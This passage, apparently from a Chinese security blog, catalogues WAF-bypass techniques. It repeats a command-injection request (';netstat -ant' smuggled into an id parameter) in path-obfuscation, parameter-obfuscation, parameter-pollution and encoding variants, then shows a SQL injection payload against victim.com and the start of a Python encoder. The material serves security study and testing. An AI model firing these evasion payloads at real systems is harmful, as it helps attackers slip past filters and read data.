+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PathObfuscation_//</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get///////?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PathObfuscation_/./</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/././?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PathObfuscation_/random/./</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/co7t/../co7t/../?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PathObfuscation_\</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">\get\?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PathObfuscation_/.//</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/.//.//?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PathObfuscation_/./\</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/././\\?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PathObfuscation_/.\</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/.\.\?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ParamObfuscation</p>
+</li>
+<li><p>原始请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ParamObfuscation_+</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?+id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ParamObfuscation_%</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?%id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ParamObfuscation_%20</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?%20id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ParamObfuscation_%00</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?%00id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h4><blockquote>
+<p>对已有参数进行赋值，参数污染</p>
+</blockquote>
+<ul>
+<li><p>原始攻击</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HPP.First_test(赋值test)</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%20-ant&amp;id=test&amp;id=test&amp;id=test</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HPP.Last_test</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=test&amp;id=test&amp;id=test&amp;id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="SpaceEncoding"><a href="#SpaceEncoding" class="headerlink" title="SpaceEncoding"></a>SpaceEncoding</h4><blockquote>
+<p>对空格进行编码</p>
+</blockquote>
+<ul>
+<li>原始攻击</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%20-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>URL编码</p>
+</li>
+<li><p>%u编码</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%u0000-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Double URL</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%2500-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Double Double</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstat%25%30%30-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HEX</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/?id=;netstatx00-ant</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 10.100.12.249:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Length</span>: 6</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="绕过实战"><a href="#绕过实战" class="headerlink" title="绕过实战"></a>绕过实战</h2><h3 id="字符编码绕过WAF"><a href="#字符编码绕过WAF" class="headerlink" title="字符编码绕过WAF"></a>字符编码绕过WAF</h3><p>在进行测试时候发现下面这段请求被拦截,很明显带有注入特征</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sample.aspx?input0=something</span> HTTP/1.1</span><br><span class="line"><span class="attribute">HOST</span>: victim.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 41</span><br><span class="line"></span><br><span class="line">input1='union all select * from users--</span><br></pre></td></tr></table></figure>
+
+<p>我们使用下面的编码技术进行编码绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 